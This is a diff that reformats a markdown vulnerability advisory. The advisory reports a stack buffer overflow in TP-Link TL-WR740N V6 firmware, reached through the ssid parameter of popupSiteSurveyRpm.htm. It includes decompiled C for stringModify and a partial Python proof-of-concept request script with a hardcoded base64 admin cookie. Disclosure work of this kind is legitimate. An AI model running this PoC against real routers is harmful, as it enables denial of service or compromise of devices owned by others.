@@ -1,24 +1,28 @@
-Overview
-Firmware download website: https://www.tp-link.com/no/support/download/tl-wr740n/#Firmware
+## Overview
 
-Affected version
+- Firmware download website: https://www.tp-link.com/no/support/download/tl-wr740n/#Firmware
+
+## Affected version
+
 TL-WR740N V6
 
-Vulnerability details
-In the TL-WR740N V6 Firmware has a stack overflow vulnerability in the /userRpm/popupSiteSurveyRpm.htm url. The v21 variable receives the ssid parameter from a POST request and is later assigned to the v53 variable, which is fixed at 17 bytes. 
+## Vulnerability details
 
-![image-20240828174236232](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240828174236232.png)image-20240828174236232
+In the TL-WR740N V6 Firmware has a stack overflow vulnerability in the `/userRpm/popupSiteSurveyRpm.htm` url. The `v21` variable receives the `ssid` parameter from a POST request and is later assigned to the `v53` variable, which is fixed at 17 bytes. 
 
-![image-20240828174451292](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240828174451292.png)image-20240828174451292
+![image-20240828174236232](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240828174236232.png)
 
-![image-20240828174610096](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240828174610096.png)image-20240828174610096
+![image-20240828174451292](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240828174451292.png)
 
-![image-20240828174647853](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240828174647853.png)image-20240828174647853
+![image-20240828174610096](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240828174610096.png)
 
-![image-20240828174718594](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240828174718594.png)image-20240828174718594
+![image-20240828174647853](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240828174647853.png)
 
-However, since the user can control the input of ssid, the statement stringModify(v8, 512, a3) can cause a buffer overflow. The user-provided ssid can exceed the capacity of the v8 array, triggering this security vulnerability.
+![image-20240828174718594](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240828174718594.png)
 
+However, since the user can control the input of `ssid`, the statement `stringModify(v8, 512, a3)` can cause a buffer overflow. The user-provided `ssid` can exceed the capacity of the `v8` array, triggering this security vulnerability.
+
+```c
 int __fastcall stringModify(_BYTE *a1, int a2, int a3)
 {
   bool v3; // dc
@@ -26,7 +30,7 @@ int __fastcall stringModify(_BYTE *a1, int a2, int a3)
   int v5; // $a3
   int v6; // $v0
   int v7; // $v1
-​
+
   if ( !a1 )
     return -1;
   v3 = a3 == 0;
@@ -84,7 +88,11 @@ LABEL_21:
   *a1 = 0;
   return v5;
 }
-PoC
+```
+
+## PoC
+
+```python
 import requests
 import urllib
 session = requests.Session()
@@ -106,4 +114,6 @@ def exp(path,cookie):
     resp = session.get(url,params=params,headers=headers)
     print (resp.text)
 exp("AMSHQZKAISQSDUOA","%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D")
+```
+
 ![image-20240828173712920](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240828173712920.png)
